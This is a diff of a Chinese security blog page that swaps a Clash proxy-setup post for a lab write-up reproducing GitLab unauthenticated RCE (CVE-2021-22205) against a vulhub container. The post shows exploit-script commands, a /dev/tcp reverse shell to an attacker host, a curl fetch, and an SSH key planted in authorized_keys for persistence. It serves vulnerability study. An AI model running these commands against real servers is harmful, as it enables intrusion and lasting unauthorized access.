@@ -15,20 +15,28 @@
 
 
 
-<meta name="description" content="Clash默认配置只会配置系统代理，这样只有浏览器的流量是走的代理，而其他一些软件或者是命令行是不走代理的，这对渗透测试过程中想要更好的隐藏自己十分的不方便，而Clash的TUN模式可以实现全流量的代理。😊😊">
+<meta name="description" content="本来早该复现完的，中间因为太多事情耽误了。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Clash配置TUN模式">
-<meta property="og:url" content="https://al0nez.github.io/2021/12/03/Clash%E9%85%8D%E7%BD%AETUN%E6%A8%A1%E5%BC%8F/index.html">
+<meta property="og:title" content="GitLab未授权RCE">
+<meta property="og:url" content="https://al0nez.github.io/2021/12/17/GitLab%E6%9C%AA%E6%8E%88%E6%9D%83RCE/index.html">
 <meta property="og:site_name" content="Al0nez&#39;s Bolg">
-<meta property="og:description" content="Clash默认配置只会配置系统代理，这样只有浏览器的流量是走的代理，而其他一些软件或者是命令行是不走代理的，这对渗透测试过程中想要更好的隐藏自己十分的不方便，而Clash的TUN模式可以实现全流量的代理。😊😊">
+<meta property="og:description" content="本来早该复现完的，中间因为太多事情耽误了。">
 <meta property="og:locale">
-<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211203175920217.png">
-<meta property="article:published_time" content="2021-12-03T10:01:05.000Z">
-<meta property="article:modified_time" content="2021-12-03T10:08:10.250Z">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216104712547.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216105224401.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216174619254.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216174715381.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216182818722.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216183027591.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211217140517410.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211217142208397.png">
+<meta property="article:published_time" content="2021-12-17T06:45:42.000Z">
+<meta property="article:modified_time" content="2021-12-17T06:47:41.511Z">
 <meta property="article:author" content="Al0nez">
-<meta property="article:tag" content="Clash">
+<meta property="article:tag" content="GitLab">
+<meta property="article:tag" content="RCE">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211203175920217.png">
+<meta name="twitter:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216104712547.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -62,7 +70,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Clash配置TUN模式 | Al0nez&#39;s Bolg</title>
+<title>GitLab未授权RCE | Al0nez&#39;s Bolg</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -223,11 +231,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-Clash配置TUN模式" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-GitLab未授权RCE" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/12/03/Clash%E9%85%8D%E7%BD%AETUN%E6%A8%A1%E5%BC%8F/" class="article-date">
-      <time datetime="2021-12-03T10:01:05.000Z" itemprop="datePublished">2021-12-03</time>
+      <a href="/2021/12/17/GitLab%E6%9C%AA%E6%8E%88%E6%9D%83RCE/" class="article-date">
+      <time datetime="2021-12-17T06:45:42.000Z" itemprop="datePublished">2021-12-17</time>
 </a>
 
 
@@ -242,7 +250,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Clash配置TUN模式
+      GitLab未授权RCE
     </h1>
   
 
@@ -253,7 +261,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Clash/" rel="tag">Clash</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/GitLab/" rel="tag">GitLab</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -263,21 +271,41 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>Clash默认配置只会配置系统代理，这样只有浏览器的流量是走的代理，而其他一些软件或者是命令行是不走代理的，这对渗透测试过程中想要更好的隐藏自己十分的不方便，而Clash的TUN模式可以实现全流量的代理。😊😊</p>
+        <p>本来早该复现完的，中间因为太多事情耽误了。</p>
 <span id="more"></span>
 
-<h3 id="TUN模式配置"><a href="#TUN模式配置" class="headerlink" title="TUN模式配置"></a>TUN模式配置</h3><p>从<code>Clash v0.17.2</code>开始，我们就不需要自己去下载wintun.dll文件了。现在，我们只需要打开Clash。</p>
-<ol>
-<li>点击<code>General</code>中<code>Service Mode</code>右边的<code>Manage</code>。在打开的窗口安装服务模式，安装完成后会自动重启，只要<code>Service Mode</code>右边的地球变成绿色的，就代表安装成功了。</li>
-<li>进入<code>Settings页面</code> <strong>&gt;</strong> <code>Profile Mixin</code> <strong>&gt;</strong> <code>YAML</code> <strong>&gt;</strong> <code>Edit</code></li>
-<li>返回<code>general</code>页面开启<code>Mixin</code>即可</li>
-</ol>
-<p>这里需要注意的是如果你在配置之前需要将<code>general</code>页面的<code>Mixin</code>关闭，如果没有关闭就配置完了，需要在配置完成后进行重启Clash。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mixin: # object</span><br><span class="line">  dns:</span><br><span class="line">    enable: true</span><br><span class="line">    enhanced-mode: redir-host</span><br><span class="line">    nameserver:</span><br><span class="line">    - 119.29.29.29</span><br><span class="line">    - 223.5.5.5</span><br><span class="line">    - 223.6.6.6</span><br><span class="line">  tun:</span><br><span class="line">    enable: true</span><br><span class="line">    stack: gvisor</span><br><span class="line">    dns-hijack:</span><br><span class="line">    - 198.18.0.2:53</span><br><span class="line">    macOS-auto-route: true</span><br><span class="line">    macOS-auto-detect-interface: true</span><br></pre></td></tr></table></figure>
+<h3 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01.漏洞介绍"></a>0x01.漏洞介绍</h3><p>GitLab是美国GitLab公司的一款使用Ruby on Rails开发的、自托管的、Git（版本控制系统）项目仓库应用程序。 由于 GitLab 没有正确验证传递给文件解析器的图像文件，攻击者可利用该漏洞在服务端进行远程命令执行。</p>
+<h3 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02.影响版本"></a>0x02.影响版本</h3><p><code>11.9 &lt;=  GitLab（CE/EE）&lt; 13.8.8</code><br><code>13.9 &lt;=  GitLab（CE/EE）&lt; 13.9.6</code><br><code>13.10 &lt;= GitLab（CE/EE）&lt; 13.10.3</code></p>
+<h3 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03.环境搭建"></a>0x03.环境搭建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub/gitlab/CVE-2021-22205/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 
-<p>全都配置完后，打开<code>控制面板</code> &gt; <code>网络和 Internet</code> &gt; <code>网络和共享中心</code> &gt; 左侧<code>更改适配器设置</code>，找到名称为<code>Clash</code>且描述为<code>Clash Tunnel</code>的适配器，如果显示已启用，说明tap模式成功开启</p>
-<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211203175920217.png" alt="image-20211203175920217"></p>
-<p>最后记得想要全部代理流量，选全局！！！</p>
+<p>访问<code>http://127.0.0.1:8080</code>即可。</p>
+<h3 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04.漏洞复现"></a>0x04.漏洞复现</h3><h4 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Al1ex/CVE-2021-22205</span><br></pre></td></tr></table></figure>
+
+<h4 id="探测漏洞是否存在"><a href="#探测漏洞是否存在" class="headerlink" title="探测漏洞是否存在"></a>探测漏洞是否存在</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2021-22205.py -v true -t http://192.168.47.156:8080/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216104712547.png" alt="image-20211216104712547"></p>
+<h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2021-22205.py -a true -t http://192.168.47.156:8080/ -c &quot;curl http://10.1.3.91:1234/1.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216105224401.png" alt="image-20211216105224401"></p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#写入shell</span><br><span class="line">python CVE-2021-22205.py -a true -t http://192.168.47.156:8080/ -c &quot;echo &#x27;bash -i &gt;&amp; /dev/tcp/10.1.3.91/6666 0&gt;</span><br><span class="line">&amp;1&#x27; &gt; /tmp/1.sh&quot;</span><br><span class="line">#赋予shell脚本执行权限</span><br><span class="line">py CVE-2021-22205.py -a true -t http://192.168.30.56/ -c &quot;chmod +x /tmp/1.sh&quot;</span><br><span class="line">#服务器监听6666端口</span><br><span class="line">nc64.exe -lvnp  6666</span><br><span class="line">#获取git权限</span><br><span class="line">py CVE-2021-22205.py -a true -t http://192.168.30.56/ -c &quot;/bin/bash /tmp/1.sh&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216174619254.png" alt="image-20211216174619254"></p>
+<p>执行完命令后，成功上线。</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216174715381.png" alt="image-20211216174715381"></p>
+<p>可以看到我们创建的1.sh也在。</p>
+<h4 id="ssh公钥登录"><a href="#ssh公钥登录" class="headerlink" title="ssh公钥登录"></a>ssh公钥登录</h4><p>通过<code>cat /etc/passwd</code>可以发现git用户可以远程ssh登录。</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216182818722.png" alt="image-20211216182818722"></p>
+<p>我们将公钥写到目标机器上进行登录。</p>
+<p>本地生成一下ssh公钥，输入<code>ssh-keygen</code>然后一路回车就OK了。</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211216183027591.png" alt="image-20211216183027591"></p>
+<p>之后利用我们之前反弹获取到的shell，将公钥下载到目标机器上。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.1.3.91:1234/gitlab_git.pub</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211217140517410.png" alt="image-20211217140517410"></p>
+<p>默认情况下git用户的authorized_keys内容为空，如果存在内容的话，先备份一下，再写入。这里要注意的是<code>authorized_keys</code>是在用户下的.ssh目录下。</p>
+<p>写入成功后进行ssh登录即可。</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211217142208397.png" alt="image-20211217142208397"></p>
+<p>后续本来想要手工再利用的，没有账号密码！！！。</p>
 
       
     </div>
@@ -286,13 +314,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2021/12/03/Clash%E9%85%8D%E7%BD%AETUN%E6%A8%A1%E5%BC%8F/">Clash配置TUN模式</a></p>
+        <p><span>本文标题:</span><a href="/2021/12/17/GitLab%E6%9C%AA%E6%8E%88%E6%9D%83RCE/">GitLab未授权RCE</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Al0nez</a></p>
-        <p><span>发布时间:</span>2021-12-03, 18:01:05</p>
-        <p><span>最后更新:</span>2021-12-03, 18:08:10</p>
+        <p><span>发布时间:</span>2021-12-17, 14:45:42</p>
+        <p><span>最后更新:</span>2021-12-17, 14:47:41</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2021/12/03/Clash%E9%85%8D%E7%BD%AETUN%E6%A8%A1%E5%BC%8F/" title="Clash配置TUN模式">https://al0nez.github.io/2021/12/03/Clash%E9%85%8D%E7%BD%AETUN%E6%A8%A1%E5%BC%8F/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://al0nez.github.io/2021/12/03/Clash%E9%85%8D%E7%BD%AETUN%E6%A8%A1%E5%BC%8F/　　作者: Al0nez" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2021/12/17/GitLab%E6%9C%AA%E6%8E%88%E6%9D%83RCE/" title="GitLab未授权RCE">https://al0nez.github.io/2021/12/17/GitLab%E6%9C%AA%E6%8E%88%E6%9D%83RCE/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://al0nez.github.io/2021/12/17/GitLab%E6%9C%AA%E6%8E%88%E6%9D%83RCE/　　作者: Al0nez" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -304,12 +332,12 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
+        
+            <div id="article-nav-older" class="article-nav-title">
                 <a href="/2021/12/08/Grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">
                     Grafana任意文件读取
                 </a>
             </div>
-        
         
     </nav>
 
@@ -319,7 +347,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#TUN%E6%A8%A1%E5%BC%8F%E9%85%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">TUN模式配置</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x01.漏洞介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">0x02.影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">0x03.环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">0x04.漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">4.1.</span> <span class="toc-text">利用脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E6%BC%8F%E6%B4%9E%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="toc-number">4.2.</span> <span class="toc-text">探测漏洞是否存在</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">4.3.</span> <span class="toc-text">下载文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">4.4.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh%E5%85%AC%E9%92%A5%E7%99%BB%E5%BD%95"><span class="toc-number">4.5.</span> <span class="toc-text">ssh公钥登录</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -350,15 +378,15 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2021/12/08/Grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" title="上一篇: Grafana任意文件读取">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+            <a href="/2021/12/08/Grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" title="下一篇: Grafana任意文件读取">
+                <i class="fa fa-angle-right"></i>
+            </a>
         
     </div>
 
